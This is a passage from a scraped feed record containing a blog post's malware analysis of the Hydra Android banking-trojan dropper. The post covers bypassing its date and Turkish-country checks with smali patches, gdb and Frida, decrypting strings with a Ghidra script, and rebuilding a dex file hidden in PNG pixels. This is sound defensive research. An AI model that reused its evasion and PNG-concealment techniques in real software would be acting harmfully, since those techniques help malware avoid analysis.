src=\"https://pentest.blog/wp-content/uploads/screenshot-1.png\" alt=\"\" class=\"wp-image-2435\"/></figure></div>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"https://pentest.blog/wp-content/uploads/screenshot_1.png\" alt=\"\" class=\"wp-image-2436\"/></figure></div>\n\n\n\n<div class=\"wp-block-image is-style-default\"><figure class=\"aligncenter size-large is-resized\"><img src=\"https://pentest.blog/wp-content/uploads/screenshot_7.png\" alt=\"\" class=\"wp-image-2443\" width=\"602\" height=\"238\"/></figure></div>\n","descriptionType":"html","publishedDate":"Mon, 09 Dec 2019 07:43:03 +0000","feedId":11893,"bgimg":"https://pentest.blog/wp-content/uploads/screenshot_5.png","linkMd5":"c887d466f740d170459712bf8a263e8b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn59@2020_3/2020/08/25/01-41-27-821_c144bcf92dff1f83.webp","destWidth":1156,"destHeight":509,"sourceBytes":56988,"destBytes":19758,"author":"Ege Balci","articleImgCdnMap":{"https://pentest.blog/wp-content/uploads/screenshot_5.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn59@2020_3/2020/08/25/01-41-27-821_c144bcf92dff1f83.webp","https://pentest.blog/wp-content/uploads/screenshot.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn36@2020_1/2020/08/25/01-41-46-942_526969ae6c34d519.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","https://pentest.blog/wp-content/uploads/source.gif":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn84@2020_5/2020/08/25/01-41-47-347_851cf2eacdabeb49.webp","https://pentest.blog/wp-content/uploads/screenshot-1.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn64@2020_4/2020/08/25/01-41-48-241_8c437602395b6427.webp","https://pentest.blog/wp-content/uploads/screenshot_1.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn47@2020_2/2020/08/25/01-41-47-137_14d7e34ed9f3755d.webp","https://pentest.blog/wp-content/uploads/screenshot_7.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn40@2020_2/2020/08/25/01-41-48-168_3371b003448c675f.webp"},"publishedOrCreatedDate":1598319687283},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Android Malware Analysis : Dissecting Hydra Dropper","link":"https://pentest.blog/?p=2182","description":"\n<p>Hydra is another android bankbot variant. It uses overlay to steal information like <a href=\"https://eybisi.run/Mobile-Malware-Analysis-Tricks-used-in-Anubis/\">Anubis</a> . Its name comes from <a href=\"https://twitter.com/PRODAFT/status/1096458491852664840\">command and control panel</a>. Through July 2018 to March 2019 there was atleast 8-10 sample on Google Play Store. Distribution of malware is similar to Anubis cases. Dropper apps are uploaded to Play Store. But unlike Anubis, Dropper apps extract dex file from png file with <em>kinda</em> stenography and downloads malicious app from command and control server with dropped dex. You can find the sample that I will go through in this post here : <a href=\"https://koodous.com/apks/46aeb04f2f03ebe7c716fc6e58a5dea763cd9b00eb7a466d10a0744f50a7368f/comments\">Dropper</a><br></p>\n\n\n\n<span id=\"more-2182\"></span>\n\n\n\n<p>ToC:</p>\n\n\n\n<ul><li>Bypass checks that on the java side</li><li>GDB Debug</li><li>Ghidra shenanigans</li><li>Understanding creation of the dex file</li><li>Bonus</li></ul>\n\n\n\n<p>First of all, if the dropper app likes the environment it runs, it will load the dex file and connect to the command and control server. There are multiple checks on java and native side. We will debug the native side with gdb and use ghidra to help us to find checks and important functions.</p>\n\n\n\n<h2>Time Check</h2>\n\n\n\n<p>When we open the first app with jadx we can see time check in class <code>com.taxationtex.giristexation.qes.Hdvhepuwy.</code></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">public static boolean j() {\n        return new Date().getTime() >= 1553655180000L &#38;&#38; new Date().getTime() &#60;= 1554519180000L;\n}</pre>\n\n\n\n<p>This function called in another class : com.taxationtex.giristexation.qes.Sctdsqres</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">class Sctdsqres {\n    private static boolean L = false;\n    private static native  void fyndmmn(Object obj);\n    Sctdsqres() {\n    }\n    static void j() {\n        if (Hdvhepuwy.j()) {\n            H();\n        }\n    }\n    static void H() {\n        if (!L) {\n            System.loadLibrary(\"hoter\");\n            L = true;\n        }\n        fyndmmn(Hdvhepuwy.j());\n    }\n}</pre>\n\n\n\n<p>First, it checks the time and if the condition holds, the app will load the native library and call <code>fyndmmn(Hdvhepuwy.j());</code> which is native function. We need to bypass this check so app will always load the library.</p>\n\n\n\n<p>I used <code>apktool</code> to disassemble apk to smali and changed <code>j()</code> to always return true.</p>\n\n\n\n<ul><li>apktool d com.taxationtex.giristexation.apk</li><li>cd com.taxationtex.giristexation/smali/com/taxationtext/giristexation/qes</li><li>edit j()Z in Hdvhepeuwy.smali</li></ul>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">.method public static j()Z\n    .locals 1\n    const/4 v0, 0x1\n    return v0\n.end method</pre>\n\n\n\n<p>rebuild apk with <code>apktool b com.taxationtex.giristexation -o hydra_time.apk</code> and sign it.</p>\n\n\n\n<p>Now time control will always return true and after loading native library and <code>fyndmmn</code> native function is called. Even with this still app doesnâ€™t load dex file.<br></p>\n\n\n\n<h2>GDB Debug</h2>\n\n\n\n<p><a href=\"https://packmad.github.io/gdb-android/\">Here</a> is a great post explaining how to setup gdb to debug native libraries. Steps:</p>\n\n\n\n<ul><li>Download android sdk with <a href=\"https://dl.google.com/android/repository/android-ndk-r20-linux-x86_64.zip\">ndk</a></li><li>adb push ~android-ndk-r20/prebuilt/android-TARGET-ARCH/gdbserver/gdbserver /data/local/tmp</li><li>adb shell &#8220;chmod 777 /data/local/tmp/gdbserver&#8221;</li><li>adb shell &#8220;ls -l /data/local/tmp/gdbserver&#8221;</li><li>get process id, ps -A | grep com.tax</li><li>/data/local/tmp/gdbserver :1337 &#8211;attach $pid</li><li>adb forward tcp:1337 tcp:1337</li><li>gdb</li><li>target remote :1337</li><li>b Java_com_tax\\TAB</li></ul>\n\n\n\n<p>There is a small problem here. App will load the library and call the native function and exit. The app needs to wait for gdb connection. My first thought was putting sleep and then connect with gdb.</p>\n\n\n\n<ul><li>apktool d hydra_time.apk</li><li>vim hydra_time/com.taxationtex.giristexation/smali/com/taxationtex/giristexation/qes/Sctdsqres.smali</li></ul>\n\n\n\n<p>after following block:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">.line 43\n:cond_0</pre>\n\n\n\n<p>Add</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">const-wide/32 v0, 0xea60\ninvoke-static {v0, v1}, Landroid/os/SystemClock;->sleep(J)V</pre>\n\n\n\n<p>and since <code>locals</code> variable is 1 and we use an extra v1 variable, increment it to 2</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">.method static H()V\n    .locals 2</pre>\n\n\n\n<p>Again sign and install the app. If all goes well the app will wait 60 seconds in a white screen. Now we can connect with gdb.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">ps | grep com.tax\n/data/local/tmp/gdbserver :1337 --attach $pid</pre>\n\n\n\n<p>I use pwndbg for better gdb experience, you can try peda or whatever you want.</p>\n\n\n\n<ul><li>adb forward tcp:1337 tcp:1337</li><li>gdb</li><li>target remote :1337 </li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/gdb-1024x462.png\" alt=\"\" class=\"wp-image-2204\" srcset=\"https://pentest.blog/wp-content/uploads/gdb-1024x462.png 1024w, https://pentest.blog/wp-content/uploads/gdb-300x135.png 300w, https://pentest.blog/wp-content/uploads/gdb-768x346.png 768w, https://pentest.blog/wp-content/uploads/gdb.png 1372w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /><figcaption>debug session</figcaption></figure>\n\n\n\n<p>It takes some time to load all libraries. Put breakpoint to native function <code>fymdmmn</code></p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/break.png\" alt=\"\" class=\"wp-image-2205\" srcset=\"https://pentest.blog/wp-content/uploads/break.png 840w, https://pentest.blog/wp-content/uploads/break-300x296.png 300w, https://pentest.blog/wp-content/uploads/break-768x758.png 768w, https://pentest.blog/wp-content/uploads/break-60x60.png 60w\" sizes=\"(max-width: 840px) 100vw, 840px\" /><figcaption>set breakpoint</figcaption></figure></div>\n\n\n\n<p>If you want to sync gdb and ghidra addresses, type vmmap at gdb and look for first entry of <code>libhoter.so</code> . <br><code>0xe73be000 0xe73fc000 r-xp    3e000 0      /data/app/com.taxationtex.giristexation-1/lib/x86/libhoter.so</code><br>So <code>0xe73be000</code> is my base address.<br>Go to <code>Window</code>-&#62; <code>Memory Map</code> and press <code>Home</code> icon on  the upper right. Put your base address and rebase the binary.</p>\n\n\n\n<p>Look at the entry of native function in ghdira:</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/hydra1-1.png\" alt=\"\" class=\"wp-image-2304\" srcset=\"https://pentest.blog/wp-content/uploads/hydra1-1.png 513w, https://pentest.blog/wp-content/uploads/hydra1-1-300x151.png 300w\" sizes=\"(max-width: 513px) 100vw, 513px\" /><figcaption>fyndmmn function</figcaption></figure></div>\n\n\n\n<p>Why call the time function ? Again time check ? Rename return value of time function (curr_time) and press <code>ctrl+shift+f</code> from assembly view and go to location that context is <code>READ</code></p>\n\n\n\n<pre class=\"wp-block-code\"><code>return (uint)(curr_time + 0xa3651a74U &#60; 0xd2f00) </code></pre>\n\n\n\n<p>So we were right, again time check. Rename the current function to <code>check_time</code>. Calculate the epoch time: </p>\n\n\n\n<pre class=\"wp-block-code\"><code>>>> 0xffffffff-0xa3651a74+0xd2f00\n>>> 1554519179\n>>> (1554519179+ 0xa3651a74) &#38; 0xffffffff &#60; 0xd2f00\n>>> True</code></pre>\n\n\n\n<p>convert epoch to time : Saturday, April 6, 2019 2:52:59 AM<br>Yep this was the time that app was on play store. Check how this boolean is used. Look for xrefs of <code>check_time</code> function.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/hydra_time.png\" alt=\"\" class=\"wp-image-2191\" srcset=\"https://pentest.blog/wp-content/uploads/hydra_time.png 504w, https://pentest.blog/wp-content/uploads/hydra_time-300x32.png 300w\" sizes=\"(max-width: 504px) 100vw, 504px\" /></figure></div>\n\n\n\n<p>Yep, as we think it will exit if time doesn&#8217;t hold.<br>First breakpoint/binary patch point is here. Or we can change emulator/phone&#8217;s time to April 5 2019.<br><code>b *(base + 0x8ba8)</code><br>But bypassing time check is not enough.</p>\n\n\n\n<h2>Ghidra Shenanigans</h2>\n\n\n\n<p>Now diving into binary file you will find multiple functions like this :</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/xor-1.png\" alt=\"\" class=\"wp-image-2306\" srcset=\"https://pentest.blog/wp-content/uploads/xor-1.png 494w, https://pentest.blog/wp-content/uploads/xor-1-241x300.png 241w\" sizes=\"(max-width: 494px) 100vw, 494px\" /><figcaption>decryption blocks</figcaption></figure></div>\n\n\n\n<p>If you look at while loop.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/while-1.png\" alt=\"\" class=\"wp-image-2307\" srcset=\"https://pentest.blog/wp-content/uploads/while-1.png 482w, https://pentest.blog/wp-content/uploads/while-1-300x54.png 300w\" sizes=\"(max-width: 482px) 100vw, 482px\" /><figcaption>xor while loop</figcaption></figure></div>\n\n\n\n<p>2 blocks of data are XORed. ( Length 0x18)  We can put breakpoint after do while but it will not be efficient solution. Let&#8217;s think a programmatic way to find decrypted strings.<br>These xor blocks are next to each other. If we can get length of blocks we can easily get decrypted string. Then find the function that use these xor blocks and rename it. Afterwards we can jump <code>2*length</code> and get next xor blocks. Repeat.<br>Starting xor block is  at <code>0x34035</code>. <br>Get xrefs of block:</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/xor_1-2.png\" alt=\"\" class=\"wp-image-2310\" srcset=\"https://pentest.blog/wp-content/uploads/xor_1-2.png 374w, https://pentest.blog/wp-content/uploads/xor_1-2-300x290.png 300w\" sizes=\"(max-width: 374px) 100vw, 374px\" /><figcaption>xor block</figcaption></figure></div>\n\n\n\n<p>go to function,</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/xor_2-1.png\" alt=\"\" class=\"wp-image-2311\" srcset=\"https://pentest.blog/wp-content/uploads/xor_2-1.png 651w, https://pentest.blog/wp-content/uploads/xor_2-1-300x130.png 300w\" sizes=\"(max-width: 651px) 100vw, 651px\" /><figcaption>get cmp value</figcaption></figure></div>\n\n\n\n<p>get size from CMP instruction, since we know the address of first xor block, add size to first address and get the address of second xor block. XOR the blocks and rename the calling function.</p>\n\n\n\n<p>Ghidra : go to <code>Window</code> -&#62; <code>Script Manager</code> -&#62; <code>Create New Script</code> -&#62; <code>Python</code>.<br>Set name for script and let&#8217;s write our ghidra script.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">import ghidra.app.script.GhidraScript\nimport exceptions\nfrom ghidra.program.model.address import AddressOutOfBoundsException\nfrom ghidra.program.model.symbol import SourceType\n\ndef xor_block(addr,size):\n\n\t## get byte list\n\tfirst_block = getBytes(toAddr(addr),size).tolist()\n\tsecond_block = getBytes(toAddr(addr+size),size).tolist()\n\n\ta = \"\"\n\t## decrypt the block\n\tfor i in range(len(first_block)):\n\t\ta += chr(first_block[i]^second_block[i])\n        ## each string have trash value at the end, delete it\n\ttrash = len(\"someval\")\n\treturn a[:-trash]\n    \ndef block(addr):\n   ## block that related to creation of dex file. pass itt\n\tif addr == 0x34755:\n\t\treturn 0x0003494f\n\t## get xrefs\n\txrefs = getReferencesTo(toAddr(addr))\n\tif len(xrefs) ==0:\n\t\t## no xrefs go to next byte\n\t\treturn addr+1\n\t\t\n\tfor xref in xrefs:\n\t\tref_addr = xref.getFromAddress()\n\t\ttry:\n\t\t\tinst = getInstructionAt(ref_addr.add(32))\n\t\texcept AddressOutOfBoundsException as e:\n\t\t\tprint(\"Found last xor block exiting..\")\n\t\t\texit()\n            \n    ## Get size of block with inst.getByte(2)\n\t\tblock_size = inst.getByte(2)\n    ## decrypt blocks\n\t\tdec_str = xor_block(addr,block_size)\n    ## get function\n\t\tfunc = getFunctionBefore(ref_addr)\n\t\tnew_name = \"dec_\"+dec_str[:-1]\n    ## rename the function\n\t\tfunc.setName(new_name,SourceType.USER_DEFINED)\n    ## log\n\t\tprint(\"Block : {} , func : {}, dec string : {}\".format(hex(addr),func.getEntryPoint(),dec_str))\n\n\treturn addr+2*block_size\n\ndef extract_encrypted_str():\n\n\t## starting block\n\tcurr_block_location = 0x34035\n\tfor i in range(200):\n\t\tcurr_block_location = block(curr_block_location)\n\ndef run():\n\textract_encrypted_str()\n\nrun()</pre>\n\n\n\n<p>To run the script, select created script in <code>Script Manager</code> and press Run.<br>Now look at the output.</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/sim-1.png\" alt=\"\" class=\"wp-image-2312\" srcset=\"https://pentest.blog/wp-content/uploads/sim-1.png 712w, https://pentest.blog/wp-content/uploads/sim-1-300x192.png 300w\" sizes=\"(max-width: 712px) 100vw, 712px\" /><figcaption>ghidra script output</figcaption></figure>\n\n\n\n<p>As you can see there are functions : <code>getSimCountryISO</code>, <code>getNetworkCountryIso</code>, <code>getCountry</code> and one suspicious string : <code>tr</code>. Without running we can assume code will check if these function&#8217;s return values are equals to <code>tr</code>. I know this app targets Turkish people so this is reasonable to avoid sandbox and even manual analyze. <br>If you follow from these functions&#8217; xrefs to function <code>FUN_00018A90()</code> (called after time check) you can see this block : <br></p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/second-1.png\" alt=\"\" class=\"wp-image-2313\" srcset=\"https://pentest.blog/wp-content/uploads/second-1.png 438w, https://pentest.blog/wp-content/uploads/second-1-300x82.png 300w\" sizes=\"(max-width: 438px) 100vw, 438px\" /><figcaption>country check</figcaption></figure></div>\n\n\n\n<p>So next patch/breakpoint is this check :<br><code>b *(base + 0x8c80)</code><br>After these checks code will drop dex and load it. If you run without patch/breakpoints only <code>edevlet</code> page is shown and nothing happens. Get your base address and try bypassing checks :</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">b *(base + 0x8ba8)\nb *(base + 0x8c80)\ncopy eip : .... a8 -> set $eip = .... aa\nc\ncopy eip : .... 80 -> set $eip = .... 82\nc</pre>\n\n\n\n<p>After these breakpoints, app will create dex file and load it. You will see Accessibility page pop-pup if you do it correctly. </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/access-1024x586.png\" alt=\"\" class=\"wp-image-2210\" srcset=\"https://pentest.blog/wp-content/uploads/access-1024x586.png 1024w, https://pentest.blog/wp-content/uploads/access-300x172.png 300w, https://pentest.blog/wp-content/uploads/access-768x440.png 768w, https://pentest.blog/wp-content/uploads/access.png 1410w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /><figcaption>checks bypassed</figcaption></figure>\n\n\n\n<p>Or we can patch <code>je</code> instructions to <code>jne</code> in native library and build apk again. </p>\n\n\n\n<h2>Understanding creation of the dex file</h2>\n\n\n\n<p>If you look for dropped file in filesystem, you won&#8217;t see anything. File is removed with <code>remove</code>. We can attach frida and catch dropped file easily. But forget about it for now and find how png file is used to create dex file. </p>\n\n\n\n<p>Look at the last parts of the ghidra script&#8217;s output.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/init-1.png\" alt=\"\" class=\"wp-image-2314\" srcset=\"https://pentest.blog/wp-content/uploads/init-1.png 911w, https://pentest.blog/wp-content/uploads/init-1-300x124.png 300w, https://pentest.blog/wp-content/uploads/init-1-768x319.png 768w\" sizes=\"(max-width: 911px) 100vw, 911px\" /><figcaption>ghidra script output</figcaption></figure></div>\n\n\n\n<p>Somehow <code>prcnbzqn.png</code> is processed with <code>AndroidBitmap</code> and dex file is created with the name <code>xwchfc.dex</code>. Then with <code>ClassLoader</code> API dex file is loaded and <code>moonlight.loader.sdk.SdkBuilder</code> class is called.</p>\n\n\n\n<p>Check function : <code>0xeec0</code></p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/asset_iterate-1.png\" alt=\"\" class=\"wp-image-2315\" srcset=\"https://pentest.blog/wp-content/uploads/asset_iterate-1.png 640w, https://pentest.blog/wp-content/uploads/asset_iterate-1-300x146.png 300w\" sizes=\"(max-width: 640px) 100vw, 640px\" /><figcaption>get png file from asset folder</figcaption></figure></div>\n\n\n\n<p>Iterates over assets and finds png file. Good. Rename this function <code>asset_caller</code>. Go to xrefs of this func and find <code>0xe2c0</code>. I renamed some of functions. <code>dex_header</code> creates dex file on memory. <code>dex_dropper</code> drops dex file to system and loads.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/up_asset-1.png\" alt=\"\" class=\"wp-image-2316\" srcset=\"https://pentest.blog/wp-content/uploads/up_asset-1.png 695w, https://pentest.blog/wp-content/uploads/up_asset-1-300x151.png 300w\" sizes=\"(max-width: 695px) 100vw, 695px\" /><figcaption>hierarchy of functions</figcaption></figure></div>\n\n\n\n<p>How dex_header creates dex file ? Go to function definition.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/dex_c-1-1.png\" alt=\"\" class=\"wp-image-2317\" srcset=\"https://pentest.blog/wp-content/uploads/dex_c-1-1.png 519w, https://pentest.blog/wp-content/uploads/dex_c-1-1-300x117.png 300w\" sizes=\"(max-width: 519px) 100vw, 519px\" /><figcaption>dex creator function</figcaption></figure></div>\n\n\n\n<p><code>bitmap_related</code> creates bitmap from png file. Bitmap object is passed to <code>dex_related</code> function. Bitmap ?</p>\n\n\n\n<p>If you read png file byte byte you don&#8217;t get color codes of pixels directly. You need to convert it to bitmap. So app first transfer png file to bitmap and read hex values of pixels. Fire up gimp/paint and look at the hex codes of first pixel of the image and compare with below picture <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/pixel.jpg\" alt=\"\" class=\"wp-image-2217\" srcset=\"https://pentest.blog/wp-content/uploads/pixel.jpg 752w, https://pentest.blog/wp-content/uploads/pixel-300x93.jpg 300w, https://pentest.blog/wp-content/uploads/pixel-750x234.jpg 750w\" sizes=\"(max-width: 752px) 100vw, 752px\" /><figcaption>rgb values of pixels</figcaption></figure>\n\n\n\n<p>Now comes fun part. How these values are used. At <code>0xfbf0</code>you can find <code>dex_related</code> function. </p>\n\n\n\n<p>Bitmap object is passed to this function. Now there are 2 important functions here:</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter\"><img src=\"https://pentest.blog/wp-content/uploads/dex_ff-1.png\" alt=\"\" class=\"wp-image-2318\" srcset=\"https://pentest.blog/wp-content/uploads/dex_ff-1.png 648w, https://pentest.blog/wp-content/uploads/dex_ff-1-300x136.png 300w\" sizes=\"(max-width: 648px) 100vw, 648px\" /><figcaption>two important function</figcaption></figure></div>\n\n\n\n<p><code>byte_chooser</code> will return one byte and <code>dex_extractor</code> will use that byte to get final dex bytes.  <code>4_cmp</code> variable is set to 0 at the beginning and will set to 0 at the end of else block. So flow will hit <code>byte_chooser</code> 2 times before entering <code>dex_extractor</code>. Here is <code>byte_chooser</code></p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/byte_chose-1.png\" alt=\"\" class=\"wp-image-2319\" srcset=\"https://pentest.blog/wp-content/uploads/byte_chose-1.png 674w, https://pentest.blog/wp-content/uploads/byte_chose-1-300x50.png 300w\" sizes=\"(max-width: 674px) 100vw, 674px\" /><figcaption>byte chooser function</figcaption></figure>\n\n\n\n<p>param_3 is hex codes of pixels. param_2 is like seed. If its first call of byte_chooser it is set to 0. In second call of byte_chooser, param_2 will be return value of first call and left shifted by 4.  Then its set to 0 at the end of else block.</p>\n\n\n\n<p>After calculating the byte by calling byte_chooser twice, return value is passed to <code>dex_extractor</code>. </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/dex_ext-1.png\" alt=\"\" class=\"wp-image-2321\" srcset=\"https://pentest.blog/wp-content/uploads/dex_ext-1.png 708w, https://pentest.blog/wp-content/uploads/dex_ext-1-300x47.png 300w\" sizes=\"(max-width: 708px) 100vw, 708px\" /><figcaption>dex byte calculator function</figcaption></figure>\n\n\n\n<p>param_2 is calculated byte param_1 is index. </p>\n\n\n\n<p>Now we know how the dex file is  created. Let&#8217;s do it with python</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">from PIL import Image\nimport struct\n\nimage_file = \"prcnbzqn.png\"\nso_file = \"libhoter.so\"\noffset = 0x34755\nsize = 0x1fa\noutput_file = \"drop.dex\"\n\n\nim = Image.open(image_file)\nrgb_im = im.convert('RGB')\nim_y = im.size[1]\nim_x = im.size[0]\n\ndex_size = im_y*im_x/2-255\n\nf = open(so_file)\nd = f.read()\nd = d[offset:offset+size]\n\ndef create_magic(p1,p2,p3):\n\treturn (p1&#60;&#60;2 &#38;4 | p2 &#38; 2 | p2 &#38; 1 | p1 &#60;&#60; 2 &#38; 8 | p3)\n\ndef dex_extractor(p1,p2):\n\treturn (p1/size)*size&#38;0xffffff00| ord(d[p1%size]) ^ p2\n\ncount = 0\ndex_file = open(output_file,\"wb\")\nsecond = False\nmagic_byte = 0\nfor y in range(0,im.size[1]):\n\tfor x in range(0,im.size[0]):\n\t\tr, g, b = rgb_im.getpixel((x, y))\n\t\tmagic_byte = create_magic(r,b,magic_byte)\n\t\tif second:\n\t\t\tmagic_byte = magic_byte &#38; 0xff\n\t\t\tdex_byte = dex_extractor(count,magic_byte)\n\t\t\tdex_byte = dex_byte &#38;0xff\n\t\t\tif count > 7 and count-8 &#60; dex_size:\n\t\t\t\tdex_file.write(struct.pack(\"B\",dex_byte))\n\t\t\tmagic_byte = 0\n\t\t\tsecond = False\n\t\t\tcount+=1\n\t\telse:\n\t\t\tmagic_byte = magic_byte &#60;&#60; 4\n\t\t\tsecond = True\n\ndex_file.close()</pre>\n\n\n\n<p>Let&#8217;s look at the output file with jadx</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/jadx-3.png\" alt=\"\" class=\"wp-image-2322\" srcset=\"https://pentest.blog/wp-content/uploads/jadx-3.png 960w, https://pentest.blog/wp-content/uploads/jadx-3-300x151.png 300w, https://pentest.blog/wp-content/uploads/jadx-3-768x387.png 768w\" sizes=\"(max-width: 960px) 100vw, 960px\" /><figcaption>dropped dex file</figcaption></figure>\n\n\n\n<p>Remember moonlight from output of ghidra script ? Yep this looks correct.</p>\n\n\n\n<h2>Frida &#60;3</h2>\n\n\n\n<p>Well I cant write an article without mentioning frida. Bypass checks with frida. </p>\n\n\n\n<ul><li>There are time checks on java and native side. </li><li>Country check</li><li>File is removed at native side.</li></ul>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">var unlinkPtr = Module.findExportByName(null, 'unlink');\n// remove bypass\nInterceptor.replace(unlinkPtr, new NativeCallback( function (a){\n     console.log(\"[+] Unlink : \" +  Memory.readUtf8String(ptr(a)))\n\n}, 'int', ['pointer']));\n\nvar timePtr = Module.findExportByName(null, 'time');\n// time bypass\nInterceptor.replace(timePtr, new NativeCallback( function (){\n    console.log(\"[+] native time bypass : \")\n    return 1554519179\n},'long', ['long']));\n\nJava.perform(function() {\n    var f = Java.use(\"android.telephony.TelephonyManager\")\n    var t = Java.use('java.util.Date')\n    //country bypass\n    f.getSimCountryIso.overload().implementation = function(){\n        console.log(\"Changing country from \" + this.getSimCountryIso() + \" to tr \")\n        return \"tr\"\n    }\n    t.getTime.implementation = function(){\n    console.log(\"[+] Java date bypass \")\n    return 1554519179000 \n    }\n })\n</pre>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/fridadex.png\" alt=\"\" class=\"wp-image-2232\" srcset=\"https://pentest.blog/wp-content/uploads/fridadex.png 896w, https://pentest.blog/wp-content/uploads/fridadex-300x170.png 300w, https://pentest.blog/wp-content/uploads/fridadex-768x436.png 768w\" sizes=\"(max-width: 896px) 100vw, 896px\" /><figcaption>output of frida session</figcaption></figure>\n\n\n\n<p>Pull the dex file with <code>adb pull path/xwcnhfc.dex</code>.</p>\n\n\n\n<h2>Homework</h2>\n\n\n\n<p>This part is homework for reader <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> Next version of this malware only use native arm binaries. So we can&#8217;t easily debug without having arm based device. But 